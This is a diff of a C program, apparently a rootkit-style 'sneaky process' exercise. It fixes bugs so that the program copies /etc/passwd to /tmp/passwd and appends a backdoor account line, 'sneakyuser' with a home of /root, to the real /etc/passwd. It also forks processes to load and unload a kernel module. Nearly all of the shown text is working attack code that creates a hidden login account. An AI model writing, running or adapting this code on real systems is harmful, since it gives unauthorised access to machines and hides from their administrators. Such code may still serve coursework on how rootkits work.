@@ -6,8 +6,8 @@
 
 
 const char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-char * src = "/etc/password";
-char * destination = "/tmp/passwd";
+const char * src = "/etc/passwd";
+const char * destination = "/tmp/passwd";
 
 
 
@@ -15,8 +15,6 @@ char * destination = "/tmp/passwd";
 void unload_module(){
 
   pid_t unload_pid = fork();
-  
-  
   if(unload_pid < 0){
     perror("fork error for unloading module process");
     exit(EXIT_FAILURE);
@@ -91,16 +89,16 @@ void load_module(){
 void copy_file(char * src, char * destination){
 
 
-  char * command = "cp";
-  char * argv[3] = {src, destination, NULL};
+  //char * command = "cp";
+  char * argv[] = {"cp", src, destination, NULL};
   pid_t copy_pid = fork();
 
   if(copy_pid < 0){
     perror("fork error for copying process");
     exit(EXIT_FAILURE);
   }
-  else if( copy_pid == 0){
-    if(execvp(command, argv) < 0){
+  else if(copy_pid == 0){
+    if(execvp(argv[0], argv) < 0){
       perror( "execution error for copy process");
       exit(EXIT_FAILURE);
     }
@@ -120,16 +118,18 @@ void copy_file(char * src, char * destination){
   }
 
 
-
-  FILE * file;
-  file = fopen(src, "a"); //open file in append mode
+  if(strcmp(src,"/etc/passwd") == 0){
+    FILE * file;
+    file = fopen(src, "a"); //open file in append mode
   if(file == NULL) {
     perror("Error opening the password file.");
-}
+  }
   else{
     fputs(line, file);
     fclose(file);
    }
+}
+
 }
 
 
